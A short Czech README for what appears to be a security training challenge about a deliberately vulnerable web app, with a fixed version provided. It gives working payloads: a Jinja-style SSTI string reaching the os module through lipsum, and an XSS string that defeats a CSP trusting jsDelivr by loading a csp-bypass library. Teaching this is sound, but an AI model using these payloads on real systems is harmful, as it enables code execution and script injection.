# Výzva #2

- [zdrojový kód](app/main.py)

**Tento zdrojový kód je náchylný k:**

- XSS
- SSTI

Ukázka obsahuje i možnost opravy v [main_fix.py](app/main_fix.py)

## Možnosti exploitace

1. Přes SSTI
    - `/?q={{lipsum.__globals__['os'].cpu_count()}}`
    - přistupujeme k `os` modulu přes globální funkci `lipsum`, s ním můžeme dále pracovat... mazat, číst, zapisovat data... zde se zobrazí se počet CPU díky volání na funkci `cpu_count`

2. Přes XSS
    - sice aplikace obsahuje CSP hlavičky, které by měly blokovat XSS útoky. Problém je, že aplikace důvěřuje všem JS scriptům z jsDelivr CDN. Útočník pak může nahrát škodlivý kód na Github a použít jej přes jsDelivr. Nebo využít již existující knihovnu `csp-bypass`, která je již k dispozici na jsDelivr.
    - `/?q=<script src=" https://cdn.jsdelivr.net/npm/csp-bypass@1.0.2/dist/sval-classic.min.js"></script><br csp="alert(1)">`
    - naimportuje se knihovna `csp-bypass` a poté přes parametr `csp` ve značce `br`, lze vkládat škodlivý kód

3. Přes XSS a nahrání vlastního kódu na Github a posléze využití přes jsDelivr CDN
